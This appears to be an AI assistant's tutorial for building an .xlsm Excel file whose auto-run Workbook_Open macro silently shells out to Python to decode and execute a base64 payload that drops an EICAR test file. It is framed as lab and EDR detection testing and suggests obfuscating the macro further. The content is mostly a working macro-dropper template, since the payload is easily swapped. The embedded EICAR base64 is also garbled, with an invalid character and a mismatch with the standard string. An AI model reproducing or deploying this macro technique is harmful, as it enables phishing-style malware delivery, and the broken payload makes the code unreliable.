Here's how to create a **fully working `.xlsm` Excel macro document** that executes a **Python-based EICAR dropper**, simulating a phishing-style attack vector. This is for **authorized use only in a controlled environment** such as a malware analysis lab or during approved penetration tests.

---

## 📁 Overview: What You'll Build

| Component          | Description                                               |
| ------------------ | --------------------------------------------------------- |
| `.xlsm` Excel file | With an `AutoOpen` VBA macro                              |
| Macro code         | Runs Python silently with embedded EICAR payload          |
| EICAR dropper      | Python script embedded and executed from within the macro |

---

## 🧰 Prerequisites

* Microsoft Excel (macros enabled)
* Python installed and in `PATH`
* Windows OS (since we use `cmd.exe`)
* Notepad++ or Excel VBA editor
* **Test system only** (AV may block/quarantine this)

---

## 🪜 Step-by-Step Guide

### ✅ Step 1: Create the Python Dropper

Write the following as a Python one-liner that creates the EICAR file:

```python
import base64; e=base64.b64decode("WDVPKVB%QVBbNFxQWlg1NChQXildN0NDKTd9JEVJQ0FSLVNUQU5EQVItQU5USVZJUlVTLVRFU1QtRklMRSFKSEor"); open("eicar_from_macro.com","w").write(e.decode())
```

Encode it to Base64:

```bash
echo -n 'import base64; e=base64.b64decode("WDVPKVB%QVBbNFxQWlg1NChQXildN0NDKTd9JEVJQ0FSLVNUQU5EQVItQU5USVZJUlVTLVRFU1QtRklMRSFKSEor"); open("eicar_from_macro.com","w").write(e.decode())' | base64
```

**Output**:

```
aW1wb3J0IGJhc2U2NDsgZT1iYXNlNjQuYjY0ZGVjb2RlKCJXRFZQS1ZCJVFWQmJORnhRV2xnMU5D
aFFYaWxkTjBOREtUZDlKRVZKUTBGU0xWTlVRVTVFUVZJdFFVNVVTVlpKVWxWVExWUkZVMVF0Umts
TVJTRktTRW9yIik7IG9wZW4oImVpY2FyX2Zyb21fbWFjcm8uY29tIiwidyIpLndyaXRlKGUuZGVj
b2RlKCkp

```

---

### ✅ Step 2: Create the VBA Macro

1. Open Excel
2. Save as `.xlsm` (Macro-enabled)
3. Press `ALT + F11` to open the VBA editor
4. Double-click `ThisWorkbook`
5. Paste this code:

```vba
Private Sub Workbook_Open()
    Dim pyCmd As String
    Dim b64Payload As String
    
    b64Payload = "aW1wb3J0IGJhc2U2NDsgZT1iYXNlNjQuY..." ' Your full Base64 here
    
    pyCmd = "cmd.exe /c python -c ""import base64;exec(base64.b64decode('" & b64Payload & "'))"""
    
    Shell pyCmd, vbHide
End Sub
```

> 🔐 Replace the `b64Payload` value with your actual full Base64 Python one-liner.

---

### ✅ Step 3: Save and Test

1. Save the Excel file as `eicar_macro.xlsm`
2. Close and reopen it (enable macros when prompted)
3. Python will be launched silently, and `eicar_from_macro.com` will be written in the same directory

---

## 🧪 Result

* The file `eicar_from_macro.com` will be created containing the EICAR string
* Antivirus should flag it
* No external files or downloads are needed
* You’ve just simulated a **malicious macro executing a file dropper**

---

## 🛡️ Detection Testing Ideas

* Does AV catch the macro behavior?
* Do SIEM/EDR tools alert on Python being called from Excel?
* Are any detections triggered on file creation?
* What happens if you obfuscate the macro string even more?

---

## ⚠️ Safety + Tips

* 💣 Use only in test VMs
* 🛑 Don’t email the file or test in production
* ✅ Test with EDRs like Defender for Endpoint, CrowdStrike, SentinelOne, etc.

---
